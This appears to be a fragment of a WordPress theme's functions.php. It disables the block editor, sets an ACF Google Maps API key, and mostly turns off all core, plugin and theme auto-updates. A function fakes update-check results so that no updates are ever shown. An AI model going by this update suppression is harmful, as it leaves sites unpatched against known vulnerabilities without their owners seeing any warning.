//mysql_query("Delete From lead_actions Where user_id=".$user_id);

	

}
add_action('delete_user', 'custom_remove_user', 10 );

add_filter( 'use_widgets_block_editor', '__return_false' );
add_filter("use_block_editor_for_post_type", "disable_gutenberg_editor");
function disable_gutenberg_editor()
{
return false;
}


add_filter( 'pre_transient_update_themes','last_checked_atm');
add_filter( 'pre_site_transient_update_themes', 'last_checked_atm' );
add_action( 'pre_transient_update_plugins', 'last_checked_atm');
add_filter( 'pre_site_transient_update_plugins', 'last_checked_atm' );
add_filter( 'pre_transient_update_core','last_checked_atm' );
add_filter( 'pre_site_transient_update_core','last_checked_atm');
add_filter( 'auto_update_translation', '__return_false' );
add_filter( 'automatic_updater_disabled', '__return_true' );
add_filter( 'allow_minor_auto_core_updates', '__return_false' );
add_filter( 'allow_major_auto_core_updates', '__return_false' );
add_filter( 'allow_dev_auto_core_updates', '__return_false' );
add_filter( 'auto_update_core', '__return_false' );
add_filter( 'wp_auto_update_core', '__return_false' );
add_filter( 'auto_core_update_send_email', '__return_false' );
add_filter( 'send_core_update_notification_email', '__return_false' );
add_filter( 'auto_update_plugin', '__return_false' );
add_filter( 'auto_update_theme', '__return_false' );
add_filter( 'automatic_updates_send_debug_email', '__return_false' );
add_filter( 'automatic_updates_is_vcs_checkout', '__return_true' );
add_filter( 'automatic_updates_send_debug_email ', '__return_false', 1 );
if( !defined( 'AUTOMATIC_UPDATER_DISABLED' ) ) define( 'AUTOMATIC_UPDATER_DISABLED', true );
if( !defined( 'WP_AUTO_UPDATE_CORE') ) define( 'WP_AUTO_UPDATE_CORE', false );

	function last_checked_atm( $t ) {
		include( ABSPATH . WPINC . '/version.php' );
		
		$current = new stdClass;
		$current->updates = array();
		$current->version_checked = $wp_version;
		$current->last_checked = time();
		
		return $current;
	}
function pre($data){
	echo "<pre>";
	print_r($data);
	echo "</pre>";

}

function wolfprop_acf_google_map_api( $api ){
    
    $api['key'] = get_field('google_map_api_key','options');
    
    return $api;
    
}

add_filter('acf/fields/google_map/api', 'wolfprop_acf_google_map_api');